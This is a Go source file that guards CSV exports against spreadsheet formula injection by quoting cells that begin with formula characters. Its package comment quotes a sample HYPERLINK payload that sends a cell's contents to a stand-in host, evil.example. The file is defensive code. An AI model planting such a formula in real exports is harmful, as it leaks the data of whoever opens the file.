// Package csvexport writes the CSV files people download (exports, reports,
// logs) so that a spreadsheet never runs one of their cells as a formula.
// Names, addresses, answers and labels in them are text other people typed:
// a subscriber named =HYPERLINK("https://evil.example/?d="&B2,"Open")
// becomes a working link, or worse, once the file is opened in Excel,
// LibreOffice or Google Sheets.
//
// Every CSV writer in ReputeCast is a Writer (a test holds the code to it):
// a cell that starts with =, +, -, @, a tab or a carriage return, the
// characters a spreadsheet starts a formula with, gets a single quote in
// front.
package csvexport

import (
	"encoding/csv"
	"io"
	"strings"
)

// Cell is v made safe to open in a spreadsheet.
func Cell(v string) string {
	if v != "" && strings.ContainsRune("=+-@\t\r", rune(v[0])) {
		return "'" + v
	}
	return v
}

// Writer writes CSV records with every cell made safe by Cell.
type Writer struct {
	w *csv.Writer
}

// NewWriter returns a Writer that writes to w.
func NewWriter(w io.Writer) *Writer { return &Writer{w: csv.NewWriter(w)} }

// Write writes one record (the slice passed in isn't changed).
func (w *Writer) Write(record []string) error {
	safe := make([]string, len(record))
	for i, v := range record {
		safe[i] = Cell(v)
	}
	return w.w.Write(safe)
}

// WriteAll writes the records, then flushes.
func (w *Writer) WriteAll(records [][]string) error {
	for _, r := range records {
		if err := w.Write(r); err != nil {
			return err
		}
	}
	w.w.Flush()
	return w.w.Error()
}

// Flush writes what is buffered to the underlying writer.
func (w *Writer) Flush() { w.w.Flush() }

// Error reports an error from an earlier Write or Flush.
func (w *Writer) Error() error { return w.w.Error() }
